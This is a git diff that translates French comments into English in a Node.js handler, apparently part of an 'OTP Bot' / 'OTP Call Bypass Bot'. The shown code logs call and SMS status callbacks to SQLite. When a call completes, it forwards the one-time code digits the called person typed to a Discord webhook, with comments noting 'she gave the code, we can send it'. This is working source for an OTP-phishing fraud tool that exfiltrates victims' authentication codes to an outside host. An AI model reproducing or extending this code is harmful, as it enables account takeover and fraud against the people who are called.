@@ -1,11 +1,11 @@
 module.exports = function(request, response) {
     /**
-     * Fichier contenant les configurations nécéssaires au bon fonctionnement du système
+     *File containing the configurations necessary for the proper functioning of the system.
      */
     const config = require('.././config');
 
     /**
-     * Instanciation des dépendences permettant l'utilisation du webhook discord
+     *Instantiation of dependencies allowing the use of the discord webhook.
      */
     const {
         Webhook,
@@ -14,13 +14,13 @@ module.exports = function(request, response) {
     const hook = new Webhook(config.discordwebhook || '');
 
     /**
-     * Intégration des dépendences SQLITE3
+     * Integration of SQLITE3 dependencies.
      */
     const sqlite3 = require('sqlite3').verbose();
     const db = new sqlite3.Database('./db/data.db');
 
     /**
-     * Récupération des variables postées permettant d'ordonner la modification du status
+     *Recovery of posted variables allowing the modification of the status to be ordered.
      */
     var itsfrom = request.body.From || null;
     var itsto = request.body.To || null;
@@ -29,13 +29,13 @@ module.exports = function(request, response) {
     var status;
 
     /**
-     * Iniation des variables permettant de définir les requêtes SQL
+     * Initiation of variables used to define SQL queries.
      */
     var table = null;
     var sidname = null;
 
     /**
-     * Si il y a un sid avec le CallSid, alors c'est un appel, sinon c'est un SMS.
+     * If there is a sid with the CallSid, ​​then it is a call, otherwise it is an SMS.
      */
     if (sid != undefined) {
         status = request.body.CallStatus;
@@ -55,7 +55,7 @@ module.exports = function(request, response) {
     }
 
     /**
-     * On vérifie si il n'y a pas déjà la donnée d'enregistrée en DB
+     *We check if the data is not already recorded in DB.
      */
     db.get('SELECT ' + sidname + ' text FROM ' + table + ' WHERE ' + sidname + ' = ?', [sid], (err, row) => {
         if (err) {
@@ -63,7 +63,7 @@ module.exports = function(request, response) {
         }
 
         /**
-         * Si elle n'est pas enregistrée, on l'insert pour la première fois
+         * If it is not saved, we insert it for the first time.
          */
         if (row == undefined) {
             db.run('INSERT INTO ' + table + '(itsfrom, itsto, status, ' + sidname + ', date) VALUES(?, ?, ?, ?, ?)', [itsfrom, itsto, status, sid, date], function(err) {
@@ -77,7 +77,7 @@ module.exports = function(request, response) {
             });
         } else {
             /**
-             * Sinon on la met à jour, principalement le status
+             *Otherwise we update it, mainly the status.
              */
             db.run('UPDATE ' + table + ' SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ' + sidname + ' = ?', [status, itsfrom, itsto, date, sid], function(err) {
                 if (err) {
@@ -85,14 +85,14 @@ module.exports = function(request, response) {
                 }
 
                 /**
-                 * Si c'est un status d'appel et qu'il est fini (completed), alors on envoi un webhook
-                 * contenant le "digits" le code récupéré lors de l'appel.
+                 *If it is a call status and it is finished, then we send a webhook
+                 * containing the “digits” code retrieved during the call.
                  * 
-                 * On vérifie aussi si le lien webhook est bien défini, sinon on n'envoi pas de webhook.
+                 * We also check if the webhook link is well defined, otherwise we do not send a webhook.
                  */
                 if (table == 'calls' && status == 'completed' && config.discordwebhook != undefined) {
                     /**
-                     * On récupère toutes les infos sur l'appel
+                     * We retrieve all the information on the call.
                      */
                     db.get('SELECT * FROM calls WHERE callSid  = ?', [sid], (err, row) => {
                         if (err) {
@@ -100,12 +100,12 @@ module.exports = function(request, response) {
                         }
 
                         /**
-                         * Si le code est vide, alors la personne n'as pas répondue / donné de code
+                         * If the code is empty, then the person did not respond / gave a code.
                          */
                         var embed;
 
                         /**
-                         * Si il y bien eu le code d'enregistré, alors on définie l'embed à envoyer
+                         * If the code was saved, then we define the embed to send.
                          */
                         if (row.digits == '' || row.digits == undefined) {
                             embed = new MessageBuilder()
@@ -116,12 +116,12 @@ module.exports = function(request, response) {
                                 .setTimestamp();
                         } else {
                             /**
-                             * Si c'est un appel de test, ne pas founir entièrement le code
+                             * If it's a test call, don't provide the entire code.
                             */
                             if (row.user == 'test') row.digits = row.digits.slice(0, 3) + '***';
 
                             /**
-                             * Elle a donné le code, on peut l'envoyer
+                             * She gave the code, we can send it.
                              */
                             embed = new MessageBuilder()
                                 .setTitle(`OTP Bot`)
@@ -132,7 +132,7 @@ module.exports = function(request, response) {
                         }
 
                         /**
-                         * Envoi du embed au webhook
+                         * Sending the embed to the webhook.
                          */
                         hook.send(embed);
                     });
@@ -143,12 +143,12 @@ module.exports = function(request, response) {
                         }
 
                         /**
-                         * Si le code est vide, alors la personne n'as pas répondue / donné de code
+                         *If the code is empty, then the person did not respond / gave a code.
                          */
                         var embed;
 
                         /**
-                         * Si il y bien eu le code d'enregistré, alors on définie l'embed à envoyer
+                         *If the code was saved, then we define the embed to send.
                          */
                         embed = new MessageBuilder()
                             .setTitle(`OTP Call Bypass Bot`)
@@ -159,7 +159,7 @@ module.exports = function(request, response) {
 
 
                         /**
-                         * Envoi du embed au webhook
+                         * Sending the embed to the webhook.
                          */
                         hook.send(embed);
                     });
